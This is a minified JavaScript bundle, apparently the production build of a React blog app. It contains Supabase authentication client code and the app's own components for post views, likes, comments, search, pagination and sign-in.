r=>{const{data:{session:s}}=r;if(!s||!s.refresh_token||!s.expires_at){this._debug("#_autoRefreshTokenTick()","no session");return}const a=Math.floor((s.expires_at*1e3-e)/ci);this._debug("#_autoRefreshTokenTick()",`access token expires in ${a} ticks, a tick lasts ${ci}ms, refresh threshold is ${_u} ticks`),a<=_u&&await this._callRefreshToken(s.refresh_token)})}catch(r){console.error("Auto refresh tick failed with error. This is likely a transient error.",r)}}finally{this._debug("#_autoRefreshTokenTick()","end")}})}catch(e){if(e.isAcquireTimeout||e instanceof Ub)this._debug("auto refresh token tick lock not available");else throw e}}async _handleVisibilityChange(){if(this._debug("#_handleVisibilityChange()"),!Ct()||!window?.addEventListener)return this.autoRefreshToken&&this.startAutoRefresh(),!1;try{this.visibilityChangedCallback=async()=>await this._onVisibilityChanged(!1),window?.addEventListener("visibilitychange",this.visibilityChangedCallback),await this._onVisibilityChanged(!0)}catch(e){console.error("_handleVisibilityChange",e)}}async _onVisibilityChanged(e){const r=`#_onVisibilityChanged(${e})`;this._debug(r,"visibilityState",document.visibilityState),document.visibilityState==="visible"?(this.autoRefreshToken&&this._startAutoRefresh(),e||(await this.initializePromise,await this._acquireLock(-1,async()=>{if(document.visibilityState!=="visible"){this._debug(r,"acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting");return}await this._recoverAndRefresh()}))):document.visibilityState==="hidden"&&this.autoRefreshToken&&this._stopAutoRefresh()}async _getUrlForProvider(e,r,s){const a=[`provider=${encodeURIComponent(r)}`];if(s?.redirectTo&&a.push(`redirect_to=${encodeURIComponent(s.redirectTo)}`),s?.scopes&&a.push(`scopes=${encodeURIComponent(s.scopes)}`),this.flowType==="pkce"){const[l,c]=await si(this.storage,this.storageKey),d=new URLSearchParams({code_challenge:`${encodeURIComponent(l)}`,code_challenge_method:`${encodeURIComponent(c)}`});a.push(d.toString())}if(s?.queryParams){const l=new URLSearchParams(s.queryParams);a.push(l.toString())}return s?.skipBrowserRedirect&&a.push(`skip_http_redirect=${s.skipBrowserRedirect}`),`${e}?${a.join("&")}`}async _unenroll(e){try{return await this._useSession(async r=>{var s;const{data:a,error:l}=r;return l?{data:null,error:l}:await de(this.fetch,"DELETE",`${this.url}/factors/${e.factorId}`,{headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token})})}catch(r){if(oe(r))return{data:null,error:r};throw r}}async _enroll(e){try{return await this._useSession(async r=>{var s,a;const{data:l,error:c}=r;if(c)return{data:null,error:c};const d=Object.assign({friendly_name:e.friendlyName,factor_type:e.factorType},e.factorType==="phone"?{phone:e.phone}:e.factorType==="totp"?{issuer:e.issuer}:{}),{data:p,error:f}=await de(this.fetch,"POST",`${this.url}/factors`,{body:d,headers:this.headers,jwt:(s=l?.session)===null||s===void 0?void 0:s.access_token});return f?{data:null,error:f}:(e.factorType==="totp"&&p.type==="totp"&&(!((a=p?.totp)===null||a===void 0)&&a.qr_code)&&(p.totp.qr_code=`data:image/svg+xml;utf-8,${p.totp.qr_code}`),{data:p,error:null})})}catch(r){if(oe(r))return{data:null,error:r};throw r}}async _verify(e){return this._acquireLock(-1,async()=>{try{return await this._useSession(async r=>{var s;const{data:a,error:l}=r;if(l)return{data:null,error:l};const c=Object.assign({challenge_id:e.challengeId},"webauthn"in e?{webauthn:Object.assign(Object.assign({},e.webauthn),{credential_response:e.webauthn.type==="create"?xC(e.webauthn.credential_response):SC(e.webauthn.credential_response)})}:{code:e.code}),{data:d,error:p}=await de(this.fetch,"POST",`${this.url}/factors/${e.factorId}/verify`,{body:c,headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token});return p?{data:null,error:p}:(await this._saveSession(Object.assign({expires_at:Math.round(Date.now()/1e3)+d.expires_in},d)),await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED",d),{data:d,error:p})})}catch(r){if(oe(r))return{data:null,error:r};throw r}})}async _challenge(e){return this._acquireLock(-1,async()=>{try{return await this._useSession(async r=>{var s;const{data:a,error:l}=r;if(l)return{data:null,error:l};const c=await de(this.fetch,"POST",`${this.url}/factors/${e.factorId}/challenge`,{body:e,headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token});if(c.error)return c;const{data:d}=c;if(d.type!=="webauthn")return{data:d,error:null};switch(d.webauthn.type){case"create":return{data:Object.assign(Object.assign({},d),{webauthn:Object.assign(Object.assign({},d.webauthn),{credential_options:Object.assign(Object.assign({},d.webauthn.credential_options),{publicKey:wC(d.webauthn.credential_options.publicKey)})})}),error:null};case"request":return{data:Object.assign(Object.assign({},d),{webauthn:Object.assign(Object.assign({},d.webauthn),{credential_options:Object.assign(Object.assign({},d.webauthn.credential_options),{publicKey:kC(d.webauthn.credential_options.publicKey)})})}),error:null}}})}catch(r){if(oe(r))return{data:null,error:r};throw r}})}async _challengeAndVerify(e){const{data:r,error:s}=await this._challenge({factorId:e.factorId});return s?{data:null,error:s}:await this._verify({factorId:e.factorId,challengeId:r.id,code:e.code})}async _listFactors(){var e;const{data:{user:r},error:s}=await this.getUser();if(s)return{data:null,error:s};const a={all:[],phone:[],totp:[],webauthn:[]};for(const l of(e=r?.factors)!==null&&e!==void 0?e:[])a.all.push(l),l.status==="verified"&&a[l.factor_type].push(l);return{data:a,error:null}}async _getAuthenticatorAssuranceLevel(){return this._acquireLock(-1,async()=>await this._useSession(async e=>{var r,s;const{data:{session:a},error:l}=e;if(l)return{data:null,error:l};if(!a)return{data:{currentLevel:null,nextLevel:null,currentAuthenticationMethods:[]},error:null};const{payload:c}=Zc(a.access_token);let d=null;c.aal&&(d=c.aal);let p=d;((s=(r=a.user.factors)===null||r===void 0?void 0:r.filter(y=>y.status==="verified"))!==null&&s!==void 0?s:[]).length>0&&(p="aal2");const m=c.amr||[];return{data:{currentLevel:d,nextLevel:p,currentAuthenticationMethods:m},error:null}}))}async fetchJwk(e,r={keys:[]}){let s=r.keys.find(d=>d.kid===e);if(s)return s;const a=Date.now();if(s=this.jwks.keys.find(d=>d.kid===e),s&&this.jwks_cached_at+IA>a)return s;const{data:l,error:c}=await de(this.fetch,"GET",`${this.url}/.well-known/jwks.json`,{headers:this.headers});if(c)throw c;return!l.keys||l.keys.length===0||(this.jwks=l,this.jwks_cached_at=a,s=l.keys.find(d=>d.kid===e),!s)?null:s}async getClaims(e,r={}){try{let s=e;if(!s){const{data:w,error:A}=await this.getSession();if(A||!w.session)return{data:null,error:A};s=w.session.access_token}const{header:a,payload:l,signature:c,raw:{header:d,payload:p}}=Zc(s);r?.allowExpired||XA(l.exp);const f=!a.alg||a.alg.startsWith("HS")||!a.kid||!("crypto"in globalThis&&"subtle"in globalThis.crypto)?null:await this.fetchJwk(a.kid,r?.keys?{keys:r.keys}:r?.jwks);if(!f){const{error:w}=await this.getUser(s);if(w)throw w;return{data:{claims:l,header:a,signature:c},error:null}}const m=ZA(a.alg),y=await crypto.subtle.importKey("jwk",f,m,!0,["verify"]);if(!await crypto.subtle.verify(m,y,c,FA(`${d}.${p}`)))throw new Du("Invalid JWT signature");return{data:{claims:l,header:a,signature:c},error:null}}catch(s){if(oe(s))return{data:null,error:s};throw s}}}As.nextInstanceID=0;const DC=As;class OC extends DC{constructor(e){super(e)}}var jC=function(n,e,r,s){function a(l){return l instanceof r?l:new r(function(c){c(l)})}return new(r||(r=Promise))(function(l,c){function d(m){try{f(s.next(m))}catch(y){c(y)}}function p(m){try{f(s.throw(m))}catch(y){c(y)}}function f(m){m.done?l(m.value):a(m.value).then(d,p)}f((s=s.apply(n,e||[])).next())})};class MC{constructor(e,r,s){var a,l,c;this.supabaseUrl=e,this.supabaseKey=r;const d=AA(e);if(!r)throw new Error("supabaseKey is required.");this.realtimeUrl=new URL("realtime/v1",d),this.realtimeUrl.protocol=this.realtimeUrl.protocol.replace("http","ws"),this.authUrl=new URL("auth/v1",d),this.storageUrl=new URL("storage/v1",d),this.functionsUrl=new URL("functions/v1",d);const p=`sb-${d.hostname.split(".")[0]}-auth-token`,f={db:gA,realtime:yA,auth:Object.assign(Object.assign({},mA),{storageKey:p}),global:fA},m=TA(s??{},f);this.storageKey=(a=m.auth.storageKey)!==null&&a!==void 0?a:"",this.headers=(l=m.global.headers)!==null&&l!==void 0?l:{},m.accessToken?(this.accessToken=m.accessToken,this.auth=new Proxy({},{get:(y,v)=>{throw new Error(`@supabase/supabase-js: Supabase Client is configured with the accessToken option, accessing supabase.auth.${String(v)} is not possible`)}})):this.auth=this._initSupabaseAuthClient((c=m.auth)!==null&&c!==void 0?c:{},this.headers,m.global.fetch),this.fetch=kA(r,this._getAccessToken.bind(this),m.global.fetch),this.realtime=this._initRealtimeClient(Object.assign({headers:this.headers,accessToken:this._getAccessToken.bind(this)},m.realtime)),this.rest=new RT(new URL("rest/v1",d).href,{headers:this.headers,schema:m.db.schema,fetch:this.fetch}),this.storage=new dA(this.storageUrl.href,this.headers,this.fetch,s?.storage),m.accessToken||this._listenForAuthEvents()}get functions(){return new kT(this.functionsUrl.href,{headers:this.headers,customFetch:this.fetch})}from(e){return this.rest.from(e)}schema(e){return this.rest.schema(e)}rpc(e,r={},s={}){return this.rest.rpc(e,r,s)}channel(e,r={config:{}}){return this.realtime.channel(e,r)}getChannels(){return this.realtime.getChannels()}removeChannel(e){return this.realtime.removeChannel(e)}removeAllChannels(){return this.realtime.removeAllChannels()}_getAccessToken(){return jC(this,void 0,void 0,function*(){var e,r;if(this.accessToken)return yield this.accessToken();const{data:s}=yield this.auth.getSession();return(r=(e=s.session)===null||e===void 0?void 0:e.access_token)!==null&&r!==void 0?r:this.supabaseKey})}_initSupabaseAuthClient({autoRefreshToken:e,persistSession:r,detectSessionInUrl:s,storage:a,userStorage:l,storageKey:c,flowType:d,lock:p,debug:f},m,y){const v={Authorization:`Bearer ${this.supabaseKey}`,apikey:`${this.supabaseKey}`};return new OC({url:this.authUrl.href,headers:Object.assign(Object.assign({},v),m),storageKey:c,autoRefreshToken:e,persistSession:r,detectSessionInUrl:s,storage:a,userStorage:l,flowType:d,lock:p,debug:f,fetch:y,hasCustomAuthorizationHeader:Object.keys(this.headers).some(w=>w.toLowerCase()==="authorization")})}_initRealtimeClient(e){return new KT(this.realtimeUrl.href,Object.assign(Object.assign({},e),{params:Object.assign({apikey:this.supabaseKey},e?.params)}))}_listenForAuthEvents(){return this.auth.onAuthStateChange((r,s)=>{this._handleTokenChanged(r,"CLIENT",s?.access_token)})}_handleTokenChanged(e,r,s){(e==="TOKEN_REFRESHED"||e==="SIGNED_IN")&&this.changedAccessToken!==s?(this.changedAccessToken=s,this.realtime.setAuth(s)):e==="SIGNED_OUT"&&(this.realtime.setAuth(),r=="STORAGE"&&this.auth.signOut(),this.changedAccessToken=void 0)}}const BC=(n,e,r)=>new MC(n,e,r);function NC(){if(typeof window<"u"||typeof process>"u")return!1;const n=process.version;if(n==null)return!1;const e=n.match(/^v(\d+)\./);return e?parseInt(e[1],10)<=18:!1}NC()&&console.warn("⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217");const LC="https://ilgxqdnvxresxgnqkcmg.supabase.co",FC="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlsZ3hxZG52eHJlc3hnbnFrY21nIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcxNTAxMzMsImV4cCI6MjA2MjcyNjEzM30.fQ-pvwNj-qSh1CAnx7XDxm9YL1vpLi-VGtlWiudt4jw",Qe=BC(LC,FC),UC=({postId:n})=>{const{theme:e}=Gn(),{toast:r}=ud(),[s,a]=C.useState(0),[l,c]=C.useState(0),[d,p]=C.useState([]),[f,m]=C.useState(""),[y,v]=C.useState("Anonymous"),[w,A]=C.useState(!1),[k,x]=C.useState(!0),B=C.useCallback(async()=>{if(!Qe)return null;const{error:q}=await Qe.from("posts").insert({id:n},{upsert:!0,ignoreDuplicates:!0});if(q&&q.code!=="23505")return console.error("Error ensuring post entry:",q),r({title:"Error",description:"Could not initialize post data.",variant:"destructive"}),null;let{data:le,error:K}=await Qe.from("posts").select("view_count, like_count").eq("id",n).single();return K?(console.error("Error fetching post data after upsert:",K),null):le},[n,r]),_=C.useCallback(async()=>{if(!Qe)return;const{data:q,error:le}=await Qe.from("comments").select("*").eq("post_id",n).order("created_at",{ascending:!1});q&&p(q),le&&console.error("Error fetching comments:",le)},[n]);C.useEffect(()=>{(async()=>{if(!Qe){x(!1),r({title:"Interactions Disabled",description:"Supabase is not connected. Interactions are disabled.",variant:"destructive"});return}x(!0);const le=await B();if(le){a(le.view_count),c(le.like_count);const{error:fe}=await Qe.rpc("increment_view",{post_row_id:n});fe?console.error("Error incrementing view:",fe):a(ae=>ae+1)}await _(),JSON.parse(localStorage.getItem("user_liked_posts")||"[]").includes(n)&&A(!0),x(!1)})()},[n,B,_,r]);const P=async()=>{if(w||!Qe)return;A(!0),c(le=>le+1);const{error:q}=await Qe.rpc("increment_like",{post_row_id:n});if(q)A(!1),c(le=>le-1),r({title:"Error",description:"Couldn't like the post.",variant:"destructive"});else{const le=JSON.parse(localStorage.getItem("user_liked_posts")||"[]");le.push(n),localStorage.setItem("user_liked_posts",JSON.stringify(le)),r({title:"Thanks!",description:"You've liked this post. ❤️"})}},M=async q=>{if(q.preventDefault(),!f.trim()||!Qe)return;const le={post_id:n,author:y.trim()||"Anonymous",content:f.trim()},{data:K,error:fe}=await Qe.from("comments").insert(le).select().single();fe?(console.error("Error posting comment:",fe),r({title:"Error",description:"Could not post comment. Please try again.",variant:"destructive"})):(p(ae=>[K,...ae]),m(""),r({title:"Comment Posted!",description:"Your comment has been successfully added."}))},V=async q=>{if(!Qe)return;const le=[...d];p(d.filter(fe=>fe.id!==q));const{error:K}=await Qe.from("comments").delete().eq("id",q);K?(p(le),r({title:"Error",description:"Could not delete comment.",variant:"destructive"})):r({title:"Comment Deleted",description:"The comment has been removed."})},U=e==="dark"?"border-slate-700/50":"border-border",W=e==="dark"?"text-primary":"text-foreground",G=e==="dark"?"text-slate-400":"text-muted-foreground",ee=e==="dark"?"bg-slate-800":"bg-background",ye=e==="dark"?"bg-slate-800/50":"bg-slate-100/80",Ae=w?"bg-red-500/20 text-red-500 cursor-not-allowed":"hover:bg-red-500/10 hover:text-red-500";return k?T.jsx("div",{className:"text-center p-4",children:"Loading interactions..."}):Qe?T.jsxs(it.div,{initial:{opacity:0},animate:{opacity:1},transition:{delay:.5,duration:.5},className:`mt-12 pt-8 border-t ${U}`,children:[T.jsxs("div",{className:"flex items-center justify-between mb-8",children:[T.jsx("h2",{className:`text-2xl font-bold ${W}`,children:"Interactions"}),T.jsxs("div",{className:`flex items-center space-x-4 ${G}`,children:[T.jsxs("div",{className:"flex items-center space-x-1",title:`${s} views`,children:[T.jsx(c0,{size:20}),T.jsx("span",{children:s})]}),T.jsxs(Kt,{variant:"ghost",size:"sm",className:`flex items-center space-x-1 ${Ae}`,onClick:P,disabled:w,children:[T.jsx(d0,{size:20,className:w?"fill-current":""}),T.jsx("span",{children:l})]})]})]}),T.jsxs("div",{className:"space-y-6",children:[T.jsxs("h3",{className:`text-xl font-semibold flex items-center ${W}`,children:[T.jsx(f0,{className:"mr-2"})," Comments (",d.length,")"]}),T.jsxs("form",{onSubmit:M,className:"space-y-4",children:[T.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-3 gap-4",children:T.jsx(_a,{type:"text",placeholder:"Your name (optional)",value:y,onChange:q=>v(q.target.value),className:`${ee} col-span-1 sm:col-span-1`})}),T.jsx(Qy,{placeholder:"Write a comment...",value:f,onChange:q=>m(q.target.value),className:`${ee} h-24`}),T.jsx("div",{className:"flex justify-end",children:T.jsxs(Kt,{type:"submit",disabled:!f.trim(),children:[T.jsx(m0,{size:16,className:"mr-2"})," Post Comment"]})})]}),T.jsx("div",{className:"space-y-4",children:T.jsx(N2,{children:d.map(q=>T.jsxs(it.div,{className:`p-4 rounded-lg ${ye} relative group`,initial:{opacity:0,y:20},animate:{opacity:1,y:0},exit:{opacity:0,x:-20},transition:{duration:.3},children:[T.jsxs("div",{className:"flex justify-between items-start",children:[T.jsxs("div",{children:[T.jsx("p",{className:"font-semibold text-primary",children:q.author}),T.jsx("p",{className:`text-xs ${G}`,children:new Date(q.created_at).toLocaleString()})]}),T.jsx(Kt,{variant:"ghost",size:"icon",className:"h-8 w-8 opacity-0 group-hover:opacity-100 transition-opacity text-destructive hover:bg-destructive/10",onClick:()=>V(q.id),children:T.jsx(b0,{size:16})})]}),T.jsx("p",{className:"mt-2 text-foreground/90",children:q.content})]},q.id))})})]})]}):null},zC=({postId:n})=>{const{theme:e}=Gn(),[r,s]=C.useState(null),[a,l]=C.useState(!0),[c,d]=C.useState("");C.useEffect(()=>{l(!0);const _=V2(n);s(_),_&&d(ga[_.imageKey]||ga.default),l(!1),window.scrollTo(0,0)},[n]);const p=e==="dark"?"bg-card":"bg-background",f="text-primary hover:text-primary/80",m=e==="dark"?"border-slate-700/50":"border-border",y=e==="dark"?"text-primary":"text-foreground",v=e==="dark"?"text-slate-400":"text-muted-foreground",w=e==="dark"?"text-accent":"text-primary",A=e==="dark"?"bg-secondary text-primary/90":"bg-secondary text-secondary-foreground",k=e==="dark"?"text-slate-300":"text-foreground/90",x=e==="dark"?"prose-invert":"",B="border-primary";return a?T.jsx("div",{className:"flex justify-center items-center min-h-[60vh]",children:T.jsx("div",{className:`animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 ${B}`})}):r?T.jsxs(it.article,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.5},className:`max-w-3xl mx-auto ${p} p-6 sm:p-8 md:p-10 rounded-xl ${e==="light"?"shadow-xl":"shadow-2xl"}`,children:[T.jsx("div",{className:"mb-8",children:T.jsxs("a",{href:"#/all-blogs",className:`inline-flex items-center ${f} transition-colors mb-6 group font-semibold text-sm`,children:[T.jsx(o0,{size:18,className:"mr-2 group-hover:-translate-x-1 transition-transform"}),"Back to Blog"]})}),T.jsxs("header",{className:`mb-8 border-b ${m} pb-8`,children:[T.jsx("h1",{className:`text-3xl md:text-4xl font-bold mb-4 ${y} leading-tight`,children:r.title}),T.jsxs("div",{className:`flex flex-wrap items-center gap-x-4 gap-y-2 ${v} text-sm`,children:[T.jsxs("span",{className:"flex items-center",children:[T.jsx(am,{size:16,className:`mr-1.5 ${w}`})," Published on ",r.date]}),T.jsxs("span",{className:"flex items-center",children:[T.jsx(cm,{size:16,className:`mr-1.5 ${w}`})," By ",r.author]})]}),r.tags&&r.tags.length>0&&T.jsxs("div",{className:"mt-4 flex flex-wrap items-center gap-2",children:[T.jsx(y0,{size:16,className:`${w}`}),r.tags.map(_=>T.jsx("span",{className:`px-2.5 py-1 ${A} text-xs rounded-full font-medium`,children:_},_))]})]}),c&&T.jsx("div",{className:"mb-8 h-64 md:h-80 w-full overflow-hidden rounded-lg shadow-md",children:T.jsx("img",{className:"w-full h-full object-cover",alt:`Illustration for ${r.title}`,src:c})}),T.jsx("div",{className:`prose ${x} prose-base md:prose-lg max-w-none content-area ${k}`,dangerouslySetInnerHTML:{__html:r.content}}),T.jsx(UC,{postId:n})]}):T.jsx(Jy,{})},VC=({currentPage:n,totalPages:e,onPageChange:r})=>{const s=()=>{n>1&&r(n-1)},a=()=>{n<e&&r(n+1)};if(e<=1)return null;const l=[],c=5;let d=Math.max(1,n-Math.floor(c/2)),p=Math.min(e,d+c-1);p-d+1<c&&(d=Math.max(1,p-c+1));for(let f=d;f<=p;f++)l.push(f);return T.jsxs("div",{className:"flex items-center justify-center space-x-2 mt-12",children:[T.jsx(Kt,{variant:"outline",size:"icon",onClick:s,disabled:n===1,"aria-label":"Go to previous page",children:T.jsx(a0,{className:"h-5 w-5"})}),d>1&&T.jsxs(T.Fragment,{children:[T.jsx(Kt,{variant:"outline",onClick:()=>r(1),children:"1"}),d>2&&T.jsx("span",{className:"text-muted-foreground",children:"..."})]}),l.map(f=>T.jsx(Kt,{variant:n===f?"default":"outline",onClick:()=>r(f),"aria-current":n===f?"page":void 0,children:f},f)),p<e&&T.jsxs(T.Fragment,{children:[p<e-1&&T.jsx("span",{className:"text-muted-foreground",children:"..."}),T.jsx(Kt,{variant:"outline",onClick:()=>r(e),children:e})]}),T.jsx(Kt,{variant:"outline",size:"icon",onClick:a,disabled:n===e,"aria-label":"Go to next page",children:T.jsx(l0,{className:"h-5 w-5"})})]})},nu=9,WC=({searchTerm:n,setSearchTerm:e})=>{const{theme:r}=Gn(),[s,a]=C.useState(1),[l,c]=C.useState([]),d=C.useMemo(()=>{let _=[...nd];return n&&(_=_.filter(P=>P.title.toLowerCase().includes(n.toLowerCase())||P.summary.toLowerCase().includes(n.toLowerCase())||P.tags&&P.tags.some(M=>M.toLowerCase().includes(n.toLowerCase())))),_.sort((P,M)=>new Date(M.date)-new Date(P.date))},[n]),p=Math.ceil(d.length/nu);C.useEffect(()=>{const _=(s-1)*nu,P=_+nu;c(d.slice(_,P)),(n||s>1)&&window.scrollTo({top:0,behavior:"smooth"})},[s,d,n]);const f=_=>{a(_)},m=C.useCallback(_=>{e(_.target.value),a(1)},[e]),y=C.useCallback(()=>{e(""),a(1)},[e]),v={hidden:{opacity:0},visible:{opacity:1,transition:{staggerChildren:.1}}},w=r==="dark"?"bg-gradient-to-br from-slate-900 via-background to-slate-950":"bg-gradient-to-br from-slate-50 via-gray-100 to-slate-100",A=r==="dark"?"bg-clip-text text-transparent bg-gradient-to-r from-primary via-accent to-primary":"text-foreground",k=r==="dark"?"text-slate-400":"text-muted-foreground",x=r==="dark"?"bg-slate-800/60 border-slate-700 text-slate-200 placeholder-slate-500 focus:ring-primary focus:border-primary":"bg-background border-border text-foreground placeholder-muted-foreground focus:ring-primary focus:border-primary shadow-sm",B=r==="dark"?"text-slate-500 group-focus-within:text-primary":"text-muted-foreground group-focus-within:text-primary";return T.jsxs("div",{className:"space-y-12",children:[T.jsxs(it.section,{initial:{opacity:0,y:-30},animate:{opacity:1,y:0},transition:{duration:.5,ease:"easeOut"},className:`text-center py-16 md:py-20 ${w} rounded-xl shadow-lg p-8`,children:[T.jsx(sm,{size:48,className:`mx-auto mb-4 ${A}`}),T.jsx("h1",{className:`text-4xl md:text-5xl font-bold mb-6 ${A}`,children:"All Blog Posts"}),T.jsx("p",{className:`text-lg md:text-xl ${k} max-w-3xl mx-auto mb-10`,children:"Browse through our entire collection of articles. Use the search to find specific topics."}),T.jsxs("div",{className:"relative max-w-xl mx-auto group",children:[T.jsx(lm,{className:`absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 ${B} transition-colors`}),T.jsx(_a,{type:"search",placeholder:"Search all articles...",className:`w-full py-3 pl-12 pr-10 rounded-lg border outline-none transition-all ${x}`,value:n,onChange:m}),n&&T.jsx("button",{onClick:y,className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors","aria-label":"Clear search",children:T.jsx(sa,{size:20})})]})]}),n&&d.length>0&&T.jsxs(it.div,{initial:{opacity:0},animate:{opacity:1},className:"text-center mb-8",children:[T.jsxs("h2",{className:"text-2xl font-semibold text-foreground",children:["Search Results for: ",T.jsx("span",{className:"text-primary",children:n})]}),T.jsxs("p",{className:"text-muted-foreground",children:[d.length," post(s) found."]})]}),d.length===0&&T.jsxs(it.div,{initial:{opacity:0,y:10},animate:{opacity:1,y:0},className:"text-center py-10",children:[T.jsx(sa,{size:48,className:"mx-auto text-destructive mb-4"}),T.jsx("h2",{className:"text-2xl font-semibold text-foreground mb-2",children:"No Articles Found"}),T.jsx("p",{className:"text-muted-foreground",children:n?`Sorry, we couldn't find any articles matching "${n}". Try a different search term.`:"There are no articles available at the moment. Check back soon!"})]}),l.length>0&&T.jsx(it.section,{variants:v,initial:"hidden",animate:"visible",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8",children:l.map(_=>T.jsx(Ky,{post:_},_.id))}),p>1&&l.length>0&&T.jsx(VC,{currentPage:s,totalPages:p,onPageChange:f})]})},$C=()=>{const[n,e]=C.useState(window.location.hash||"#/"),[r,s]=C.useState(null),[a,l]=C.useState("");C.useEffect(()=>{const p=()=>{const f=window.location.hash||"#/";e(f),f.startsWith("#/post/")?s(f.substring(7)):s(null)};return window.addEventListener("hashchange",p),p(),()=>{window.removeEventListener("hashchange",p)}},[]);const c=C.useCallback(p=>{l(p)},[]),d=()=>{let p,f={};return n==="#/"||n==="#"?(p=TS,f={searchTerm:a,setSearchTerm:c}):n==="#/all-blogs"?(p=WC,f={searchTerm:a,setSearchTerm:c}):n.startsWith("#/post/")&&r?(p=zC,f={postId:r}):p=Jy,T.jsx(p,{...f})};return T.jsx(z2,{routeKey:n,children:d()})},HC=dT,$b=Ee.forwardRef(({className:n,...e},r)=>T.jsx(bb,{ref:r,className:kt("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",n),...e}));$b.displayName=bb.displayName;const qC=Gy("data-[swipe=move]:transition-none group relative pointer-events-auto flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full data-[state=closed]:slide-out-to-right-full",{variants:{variant:{default:"bg-background border",destructive:"group destructive border-destructive bg-destructive text-destructive-foreground"}},defaultVariants:{variant:"default"}}),Hb=Ee.forwardRef(({className:n,variant:e,...r},s)=>T.jsx(vb,{ref:s,className:kt(qC({variant:e}),n),...r}));Hb.displayName=vb.displayName;const GC=Ee.forwardRef(({className:n,...e},r)=>T.jsx(xb,{ref:r,className:kt("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-destructive/30 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive",n),...e}));GC.displayName=xb.displayName;const qb=Ee.forwardRef(({className:n,...e},r)=>T.jsx(Sb,{ref:r,className:kt("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",n),"toast-close":"",...e,children:T.jsx(w0,{className:"h-4 w-4"})}));qb.displayName=Sb.displayName;const Gb=Ee.forwardRef(({className:n,...e},r)=>T.jsx(wb,{ref:r,className:kt("text-sm font-semibold",n),...e}));Gb.displayName=wb.displayName;const Kb=Ee.forwardRef(({className:n,...e},r)=>T.jsx(kb,{ref:r,className:kt("text-sm opacity-90",n),...e}));Kb.displayName=kb.displayName;function KC(){const{toasts:n}=ud();return T.jsxs(HC,{children:[n.map(({id:e,title:r,description:s,action:a,...l})=>T.jsxs(Hb,{...l,children:[T.jsxs("div",{className:"grid gap-1",children:[r&&T.jsx(Gb,{children:r}),s&&T.jsx(Kb,{children:s})]}),a,T.jsx(qb,{})]},e)),T.jsx($b,{})]})}const JC=C.createContext(void 0),QC=({children:n})=>{const{toast:e}=ud(),[r,s]=C.useState(null),[a,l]=C.useState(null),[c,d]=C.useState(!0),p=C.useCallback(async w=>{l(w),s(w?.user??null),d(!1)},[]);C.useEffect(()=>{(async()=>{const{data:{session:k}}=await Qe.auth.getSession();p(k)})();const{data:{subscription:A}}=Qe.auth.onAuthStateChange(async(k,x)=>{p(x)});return()=>A.unsubscribe()},[p]);const f=C.useCallback(async(w,A,k)=>{const{error:x}=await Qe.auth.signUp({email:w,password:A,options:k});return x&&e({variant:"destructive",title:"Sign up Failed",description:x.message||"Something went wrong"}),{error:x}},[e]),m=C.useCallback(async(w,A)=>{const{error:k}=await Qe.auth.signInWithPassword({email:w,password:A});return k&&e({variant:"destructive",title:"Sign in Failed",description:k.message||"Something went wrong"}),{error:k}},[e]),y=C.useCallback(async()=>{const{error:w}=await Qe.auth.signOut();return w&&e({variant:"destructive",title:"Sign out Failed",description:w.message||"Something went wrong"}),{error:w}},[e]),v=C.useMemo(()=>({user:r,session:a,loading:c,signUp:f,signIn:m,signOut:y}),[r,a,c,f,m,y]);return T.jsx(JC.Provider,{value:v,children:n})};n0.createRoot(document.getElementById("root")).render(T.jsx(Ee.StrictMode,{children:T.jsxs(L2,{defaultTheme:"light",storageKey:"cyberblog-theme",children:[T.jsx(QC,{children:T.jsx($C,{})}),T.jsx(KC,{})]})}));
